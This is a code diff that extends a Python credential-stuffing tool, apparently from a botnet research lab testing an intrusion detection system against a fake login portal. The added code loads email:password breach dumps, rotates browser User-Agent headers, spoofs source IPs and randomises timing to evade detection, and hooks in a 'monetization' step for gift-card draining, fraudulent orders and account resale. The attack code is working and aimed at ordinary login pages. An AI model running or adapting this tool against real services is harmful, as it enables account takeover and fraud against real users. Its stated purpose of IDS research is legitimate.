@@ -16,13 +16,30 @@ The IDS (ids_detector.py Engine 2) monitors for:
   - Rigid inter-arrival timing (low CV)
   - High login volume from one IP
 
-Three modes to test IDS evasion:
-  1) BOT mode: rigid timing (easy to detect)
-  2) JITTER mode: randomized delays (harder to detect)
+Four modes to test IDS evasion:
+  1) BOT mode:         rigid timing (easy to detect, CV ≈ 0.01)
+  2) JITTER mode:      randomized delays (harder to detect)
   3) DISTRIBUTED mode: simulate multiple source IPs (hardest)
+  4) HUMAN mode:       Gaussian delays (FPR baseline)
 
 Research question: At what jitter level does CV-based
 detection fail? (Answer: ~500ms stddev — see Graph 3)
+
+NEW FLAGS (added to match Castle credential stuffing article):
+  --creds-file PATH  Load credentials from a breach dump file
+                     (format: email:password one per line).
+                     Simulates sourcing from Collection #1 /
+                     stealer logs / Telegram combo lists.
+  --monetize         After the run, invoke monetization_sim.py
+                     on all valid hits.  Models gift-card drain,
+                     fraudulent orders, account resale, password
+                     pivot to other services, and combo export.
+  --ua-rotate        Rotate User-Agent and Accept-* headers per
+                     request (8-entry pool: Chrome/Firefox/Safari
+                     on Win/Mac/Linux).  Raises the bar for IDS
+                     Engine 6 cross-IP fingerprint correlation.
+                     Without this flag every request shares the
+                     same UA — the simplest possible fingerprint.
 """
 
 import os
@@ -82,24 +99,123 @@ DEFAULT_CREDS = [
     ("jane.doe@corp.com",  "Jane2024"),
 ]
 
+# ── Realistic browser User-Agent pool (new — for --ua-rotate) ─
+# Rotating through this pool varies the browser fingerprint hash
+# computed by ip_reputation.py, raising the bar for Engine 6
+# cross-IP fingerprint correlation detection.
+UA_POOL = [
+    # Chrome / Windows
+    ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
+     "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+     "en-US,en;q=0.9", "gzip, deflate, br"),
+    ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
+     "(KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+     "en-GB,en;q=0.9", "gzip, deflate, br"),
+    # Chrome / macOS
+    ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 "
+     "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+     "en-US,en;q=0.9,fr;q=0.8", "gzip, deflate, br"),
+    # Chrome / Linux
+    ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
+     "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+     "en-US,en;q=0.9", "gzip, deflate, br"),
+    # Firefox / Windows
+    ("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) "
+     "Gecko/20100101 Firefox/121.0",
+     "en-US,en;q=0.5", "gzip, deflate, br"),
+    # Firefox / Linux
+    ("Mozilla/5.0 (X11; Linux x86_64; rv:120.0) "
+     "Gecko/20100101 Firefox/120.0",
+     "en-US,en;q=0.5", "gzip, deflate"),
+    # Safari / macOS
+    ("Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/605.1.15 "
+     "(KHTML, like Gecko) Version/17.1 Safari/605.1.15",
+     "en-US,en;q=0.9", "gzip, deflate, br"),
+    # Edge / Windows
+    ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
+     "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
+     "en-US,en;q=0.9", "gzip, deflate, br"),
+]
+
+# ── Breach dump loader (new — for --creds-file) ───────────────
+
+def load_creds_from_file(path: str) -> list:
+    """
+    Load email:password pairs from a breach dump file.
+
+    Supported formats:
+      email:password   (most common combo-list format)
+      email;password   (semicolon separator)
+      Lines starting with # are treated as comments.
+
+    Simulates the attacker workflow described in the article:
+      "Attackers collect username-password pairs from public leaks
+       (e.g. Collection #1), stealer logs, or breach dumps traded
+       in underground marketplaces, often formatted as email:password."
+    """
+    if not os.path.exists(path):
+        print(f"[CS] ERROR: credential file not found: {path}")
+        sys.exit(1)
+
+    creds   = []
+    skipped = 0
+    with open(path, "r", encoding="utf-8", errors="replace") as f:
+        for line in f:
+            line = line.strip()
+            if not line or line.startswith("#"):
+                continue
+            for sep in (":", ";"):
+                if sep in line:
+                    email, _, pwd = line.partition(sep)
+                    email = email.strip()
+                    pwd   = pwd.strip()
+                    if "@" in email and pwd:
+                        creds.append((email, pwd))
+                        break
+            else:
+                skipped += 1
+
+    print(f"[CS] Loaded {len(creds)} credential pairs from {path} "
+          f"({skipped} lines skipped)")
+    return creds
+
 
 # ── HTTP helpers ──────────────────────────────────────────────
 
 def post_login(host: str, port: int, email: str, password: str,
-               timeout: float = 5.0) -> tuple[int, str]:
+               timeout: float = 5.0,
+               ua_rotate: bool = False,
+               extra_headers: dict = None) -> tuple:
     """
     HTTP POST to /login with form data.
     Returns (status_code, response_body).
+
+    When ua_rotate=True, picks a random UA+Accept-Language+Accept-Encoding
+    combination from UA_POOL, varying the browser fingerprint per request.
+    Without it, uses a fixed research UA (easy Engine 6 fingerprint target).
     """
-    body   = urllib.parse.urlencode({"email": email, "password": password}).encode()
-    url    = f"http://{host}:{port}{LOGIN_PATH}"
-    req    = urllib.request.Request(
-        url, data=body,
-        headers={
-            "Content-Type": "application/x-www-form-urlencoded",
-            "User-Agent": "Mozilla/5.0 (compatible; Research/1.0)",
+    body = urllib.parse.urlencode({"email": email, "password": password}).encode()
+    url  = f"http://{host}:{port}{LOGIN_PATH}"
+
+    if ua_rotate:
+        ua, lang, enc = random.choice(UA_POOL)
+        headers = {
+            "Content-Type":    "application/x-www-form-urlencoded",
+            "User-Agent":      ua,
+            "Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+            "Accept-Language": lang,
+            "Accept-Encoding": enc,
         }
-    )
+    else:
+        headers = {
+            "Content-Type": "application/x-www-form-urlencoded",
+            "User-Agent":   "Mozilla/5.0 (compatible; Research/1.0)",
+        }
+
+    if extra_headers:
+        headers.update(extra_headers)
+
+    req = urllib.request.Request(url, data=body, headers=headers)
     try:
         with urllib.request.urlopen(req, timeout=timeout) as resp:
             return resp.status, resp.read().decode()
@@ -121,7 +237,7 @@ def get_portal_stats(host: str, port: int) -> dict:
 
 # ── Timing analysis (mirrors IDS Engine 2 logic) ─────────────
 
-def compute_cv(timestamps: list[float]) -> float:
+def compute_cv(timestamps: list) -> float:
     """Compute Coefficient of Variation of inter-arrival times."""
     if len(timestamps) < 3:
         return float('inf')
@@ -132,13 +248,13 @@ def compute_cv(timestamps: list[float]) -> float:
     return statistics.stdev(intervals) / mean
 
 
-def show_timing_analysis(timestamps: list[float], mode: str):
+def show_timing_analysis(timestamps: list, mode: str):
     """Print CV analysis matching what the IDS sees."""
     if len(timestamps) < 3:
         return
     cv = compute_cv(timestamps)
     intervals = [timestamps[i] - timestamps[i-1] for i in range(1, len(timestamps))]
-    mean_ms = statistics.mean(intervals) * 1000
+    mean_ms  = statistics.mean(intervals) * 1000
     stdev_ms = statistics.stdev(intervals) * 1000 if len(intervals) > 1 else 0
 
     print(f"\n[CS] ─── Timing Analysis ({mode}) ───")
@@ -169,7 +285,7 @@ class CredentialStuffer:
     def __init__(self, host: str = TARGET_HOST, port: int = TARGET_PORT,
                  creds: list = None, mode: str = "bot",
                  base_interval_ms: int = 500, jitter_ms: int = 0,
-                 n_workers: int = 1):
+                 n_workers: int = 1, ua_rotate: bool = False):
         self.host             = host
         self.port             = port
         self.creds            = creds or DEFAULT_CREDS
@@ -177,6 +293,7 @@ class CredentialStuffer:
         self.base_interval_ms = base_interval_ms
         self.jitter_ms        = jitter_ms
         self.n_workers        = n_workers
+        self.ua_rotate        = ua_rotate
 
         self.results     = []   # (email, password, status, success, ts)
         self.timestamps  = []   # for CV analysis
@@ -210,16 +327,33 @@ class CredentialStuffer:
         ts = time.time()
 
         if self.mode == "distributed":
-            # Spoof X-Forwarded-For to simulate different source IPs
+            # Spoof X-Forwarded-For to simulate different source IPs.
+            # Uses inline urllib.request.Request (preserving original distributed
+            # mode behavior) but also respects ua_rotate for the User-Agent.
             fake_ip = self._make_fake_ip()
             body = urllib.parse.urlencode({"email": email, "password": password}).encode()
             url  = f"http://{self.host}:{self.port}{LOGIN_PATH}"
-            req  = urllib.request.Request(url, data=body, headers={
-                "Content-Type": "application/x-www-form-urlencoded",
-                "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; rv:{random.randint(90,120)}.0)",
-                "X-Forwarded-For": fake_ip,
-                "X-Real-IP": fake_ip,
-            })
+
+            if self.ua_rotate:
+                ua, lang, enc = random.choice(UA_POOL)
+                hdrs = {
+                    "Content-Type":    "application/x-www-form-urlencoded",
+                    "User-Agent":      ua,
+                    "Accept":          "text/html,application/xhtml+xml,*/*;q=0.8",
+                    "Accept-Language": lang,
+                    "Accept-Encoding": enc,
+                    "X-Forwarded-For": fake_ip,
+                    "X-Real-IP":       fake_ip,
+                }
+            else:
+                hdrs = {
+                    "Content-Type":  "application/x-www-form-urlencoded",
+                    "User-Agent":    f"Mozilla/5.0 (Windows NT 10.0; rv:{random.randint(90,120)}.0)",
+                    "X-Forwarded-For": fake_ip,
+                    "X-Real-IP":       fake_ip,
+                }
+
+            req = urllib.request.Request(url, data=body, headers=hdrs)
             try:
                 with urllib.request.urlopen(req, timeout=5) as resp:
                     status, body_resp = resp.status, resp.read().decode()
@@ -228,8 +362,12 @@ class CredentialStuffer:
             except Exception:
                 status, body_resp = 0, ""
         else:
-            status, body_resp = post_login(self.host, self.port, email, password)
+            status, body_resp = post_login(
+                self.host, self.port, email, password,
+                ua_rotate=self.ua_rotate
+            )
 
+        # Original success check: status 200 AND body contains "success"
         success = status == 200 and "success" in body_resp.lower()
 
         with self._lock:
@@ -249,6 +387,7 @@ class CredentialStuffer:
         print(f"[CS] Target: {self.host}:{self.port}{LOGIN_PATH}")
         print(f"[CS] Credentials: {len(self.creds)} pairs")
         print(f"[CS] Interval: {self.base_interval_ms}ms ±{self.jitter_ms}ms")
+        print(f"[CS] UA rotation: {'ON' if self.ua_rotate else 'OFF'}")
         print()
 
         for i, (email, password) in enumerate(self.creds):
@@ -270,9 +409,10 @@ class CredentialStuffer:
         """
         print(f"\n[CS] Starting DISTRIBUTED attack")
         print(f"[CS] Workers: {self.n_workers}  |  Target RPS: {requests_per_second}")
+        print(f"[CS] UA rotation: {'ON' if self.ua_rotate else 'OFF'}")
 
-        chunk_size = max(1, len(self.creds) // self.n_workers)
-        threads    = []
+        chunk_size  = max(1, len(self.creds) // self.n_workers)
+        threads     = []
         interval_ms = int(1000.0 / requests_per_second / self.n_workers)
 
         for w in range(self.n_workers):
@@ -345,11 +485,11 @@ def simulate_human_baseline(host: str = TARGET_HOST, port: int = TARGET_PORT,
         time.sleep(delay)
 
         email, password = random.choice(list(zip(emails, passwds)))
-        status, body = post_login(host, port, email, password)
+        status, body = post_login(host, port, email, password, ua_rotate=True)
         ts = time.time()
         timestamps.append(ts)
 
-        success = status == 200
+        success = status == 200 and "success" in body.lower()
         if success:
             successes += 1
         print(f"[HUMAN] {'✓' if success else '✗'} {email}  delay={delay:.2f}s")
@@ -370,22 +510,47 @@ if __name__ == "__main__":
                         choices=["bot", "jitter", "distributed", "human"],
                         default="bot",
                         help="Attack mode (default: bot)")
-    parser.add_argument("--interval",  type=int,   default=500,
+    parser.add_argument("--interval",   type=int,   default=500,
                         help="Base interval between requests in ms (default: 500)")
-    parser.add_argument("--jitter",    type=int,   default=0,
+    parser.add_argument("--jitter",     type=int,   default=0,
                         help="Jitter ±ms (0=none, try 100/300/500/1000 for Graph 3)")
-    parser.add_argument("--workers",   type=int,   default=3,
+    parser.add_argument("--workers",    type=int,   default=3,
                         help="Worker threads for distributed mode (default: 3)")
-    parser.add_argument("--host",      default=TARGET_HOST,
+    parser.add_argument("--host",       default=TARGET_HOST,
                         help=f"Target host (default: {TARGET_HOST})")
-    parser.add_argument("--port",      type=int,   default=TARGET_PORT,
+    parser.add_argument("--port",       type=int,   default=TARGET_PORT,
                         help=f"Target port (default: {TARGET_PORT})")
+    # new flags
+    parser.add_argument("--creds-file", default=None, metavar="PATH",
+                        help="Load credentials from a breach dump file "
+                             "(format: email:password, one per line). "
+                             "Simulates sourcing from Collection #1 / Telegram combo lists.")
+    parser.add_argument("--monetize",   action="store_true",
+                        help="After attack, run monetization_sim.py on all valid hits "
+                             "(gift-card drain, fraudulent orders, resale, password pivot).")
+    parser.add_argument("--ua-rotate",  action="store_true",
+                        help="Rotate User-Agent and Accept headers per-request "
+                             "(raises bar for IDS Engine 6 fingerprint correlation). "
+                             "Without this flag all requests share the same UA.")
     args = parser.parse_args()
 
     print("=" * 60)
     print(" Credential Stuffing Module - AUA Botnet Research Lab")
     print(" ISOLATED ENVIRONMENT ONLY")
     print("=" * 60)
+
+    # Load credentials
+    if args.creds_file:
+        print(f"[CS] Loading credentials from breach dump: {args.creds_file}")
+        creds = load_creds_from_file(args.creds_file)
+    else:
+        creds = DEFAULT_CREDS
+        print(f"[CS] Using default credential list ({len(creds)} pairs)")
+
+    if args.ua_rotate:
+        print(f"[CS] UA rotation: ON — browser fingerprint varies per request")
+    else:
+        print(f"[CS] UA rotation: OFF — single UA (easy Engine 6 fingerprint target)")
 
     # Quick connectivity check
     try:
@@ -397,29 +562,53 @@ if __name__ == "__main__":
         print(f"[CS] Make sure fake_portal.py is running on the victim VM")
         sys.exit(1)
 
+    hits = []
+
     if args.mode == "human":
         simulate_human_baseline(args.host, args.port, n_attempts=15)
 
     elif args.mode == "distributed":
         stuffer = CredentialStuffer(
             host=args.host, port=args.port,
+            creds=creds,
             mode="distributed",
             base_interval_ms=args.interval,
             jitter_ms=args.jitter,
-            n_workers=args.workers
+            n_workers=args.workers,
+            ua_rotate=args.ua_rotate,
         )
         stuffer.run_distributed(requests_per_second=4.0)
+        hits = stuffer.successes
 
     else:
         # bot or jitter mode
         jitter = 0 if args.mode == "bot" else (args.jitter or 200)
         stuffer = CredentialStuffer(
             host=args.host, port=args.port,
+            creds=creds,
             mode=args.mode,
             base_interval_ms=args.interval,
-            jitter_ms=jitter
+            jitter_ms=jitter,
+            ua_rotate=args.ua_rotate,
         )
         stuffer.run_sequential()
+        hits = stuffer.successes
+
+    # ── Monetization pipeline (new — --monetize flag) ─────────
+    if args.monetize and args.mode != "human":
+        if hits:
+            print(f"\n[CS] Running monetization pipeline on {len(hits)} hit(s)...")
+            try:
+                import monetization_sim
+                monetization_sim.run_monetization(hits)
+            except ImportError:
+                print("[CS] WARNING: monetization_sim.py not found in working directory.")
+                print("[CS] Copy it alongside cred_stuffing.py to enable monetization.")
+        else:
+            print("[CS] No valid hits — skipping monetization.")
 
     print(f"\n[CS] Done. Review IDS logs on victim VM to see detection results.")
     print(f"[CS] Graph 3 tip: re-run with --jitter 0,100,300,500,750,1000 and record CV + detection.")
+    if not args.ua_rotate:
+        print(f"[CS] Engine 6 tip: run WITHOUT --ua-rotate so all requests share the same "
+              f"fingerprint, then check /stats/advanced on the portal for fingerprint reuse alerts.")
